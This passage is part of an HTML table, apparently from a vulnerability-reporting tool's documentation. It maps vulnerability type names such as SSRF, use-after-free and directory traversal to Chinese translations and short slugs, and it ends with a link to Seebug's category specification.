    <tr><td>Fingerprinting </td><td> 指纹识别 </td><td> finger</td></tr>
    <tr><td>Format String </td><td> 格式化字符串 </td><td> format-string</td></tr>
    <tr><td>HTTP Response Smuggling </td><td> http响应伪造 </td><td> http-response-smuggling</td></tr>
    <tr><td>HTTP Response Splitting </td><td> http响应拆分 </td><td> http-response-splitting</td></tr>
    <tr><td>HTTP Request Splitting </td><td> http请求拆分 </td><td> http-request-splitting</td></tr>
    <tr><td>HTTP Request Smuggling </td><td> http请求伪造 </td><td> http-request-smuggling</td></tr>
    <tr><td>HTTP Parameter Pollution </td><td> http参数污染 </td><td> hpp</td></tr>
    <tr><td>Integer Overflows </td><td> 整数溢出 </td><td> int-overflow</td></tr>
    <tr><td>Predictable Resource Location </td><td> 可预测资源定位 </td><td> res-location</td></tr>
    <tr><td>Session Fixation </td><td> 会话固定 </td><td> session-fixation</td></tr>
    <tr><td>URL Redirector Abuse </td><td> url重定向 </td><td> redirect</td></tr>
    <tr><td>Privilege Escalation </td><td> 权限提升 </td><td> privilege-escalation</td></tr>
    <tr><td>Resolve Error </td><td> 解析错误 </td><td> resolve-error</td></tr>
    <tr><td>Arbitrary File Creation </td><td> 任意文件创建 </td><td> file-creation</td></tr>
    <tr><td>Arbitrary File Download </td><td> 任意文件下载 </td><td> file-download</td></tr>
    <tr><td>Arbitrary File Deletion </td><td> 任意文件删除 </td><td> file-deletion</td></tr>
    <tr><td>Arbitrary File Read </td><td> 任意文件读取 </td><td> file-read</td></tr>
    <tr><td>Backup File Found </td><td> 备份文件发现 </td><td> bak-file-found</td></tr>
    <tr><td>Database Found </td><td> 数据库发现 </td><td> db-found</td></tr>
    <tr><td>Directory Listing </td><td> 目录遍历 </td><td> dir-listing</td></tr>
    <tr><td>Directory Traversal </td><td> 目录穿越 </td><td> dir-traversal</td></tr>
    <tr><td>File Upload </td><td> 文件上传 </td><td> file-upload</td></tr>
    <tr><td>Login Bypass </td><td> 登录绕过 </td><td> login-bypass</td></tr>
    <tr><td>Weak Password </td><td> 弱密码 </td><td> weak-pass</td></tr>
    <tr><td>Remote Password Change </td><td> 远程密码修改 </td><td> remote-pass-change</td></tr>
    <tr><td>Code Disclosure </td><td> 代码泄漏 </td><td> code-disclosure</td></tr>
    <tr><td>Path Disclosure </td><td> 路径泄漏 </td><td> path-disclosure</td></tr>
    <tr><td>Information Disclosure </td><td> 信息泄漏 </td><td> info-disclosure</td></tr>
    <tr><td>Security Mode Bypass </td><td> 安全模式绕过 </td><td> sec-bypass</td></tr>
    <tr><td>Malware </td><td> 挂马 </td><td> mal</td></tr>
    <tr><td>Black Link </td><td> 暗链 </td><td> black-link</td></tr>
    <tr><td>Backdoor </td><td> 后门 </td><td> backdoor</td></tr>
    <tr><td>Insecure Cookie Handling </td><td> 不安全的Cookie </td><td> insecure-cookie-handling</td></tr>
    <tr><td>Shellcode </td><td> Shellcode </td><td> shellcode</td></tr>
    <tr><td>Variable Coverage </td><td> 变量覆盖 </td><td> variable-coverage</td></tr>
    <tr><td>Injecting Malware Codes </td><td> 恶意代码注入 </td><td> injecting-malware-codes</td></tr>
    <tr><td>Upload Files </td><td> 文件上传 </td><td> upload-files</td></tr>
    <tr><td>Local Overflow </td><td> 本地溢出 </td><td> local-overflow</td></tr>
    <tr><td>Path Traversal </td><td> 目录穿越 </td><td> path-traversal</td></tr>
    <tr><td>Unauthorized Access </td><td> 未授权访问 </td><td> unauth-access</td></tr>
    <tr><td>Remote Overflow </td><td> 远程溢出 </td><td> remote-overflow</td></tr>
    <tr><td>Man-in-the-middle </td><td> 中间人攻击 </td><td> mitm</td></tr>
    <tr><td>Out of Memory </td><td> 内存溢出 </td><td> out-of-memory</td></tr>
    <tr><td>Buffer Over-read </td><td> 缓冲区越界读 </td><td> buffer-over-read</td></tr>
    <tr><td>Backup File Found </td><td> 备份文件泄漏 </td><td> backup-file-found</td></tr>
    <tr><td>Use After Free </td><td> 释放后使用 </td><td> uaf</td></tr>
    <tr><td>DNS Hijacking </td><td> DNS劫持 </td><td> dns-hijacking</td></tr>
    <tr><td>Improper Input Validation </td><td> 不正确的输入校验 </td><td> improper-input-validation</td></tr>
    <tr><td>Universal Cross-site Scripting </td><td> 通用型XSS </td><td> uxss</td></tr>
    <tr><td>Server-Side Request Forgery </td><td> 服务器端请求伪造 </td><td> ssrf</td></tr>
    <tr><td>Other </td><td> 其他 </td><td> other</td></tr>
</table>

也可以参见[漏洞类型规范](http://seebug.org/category)
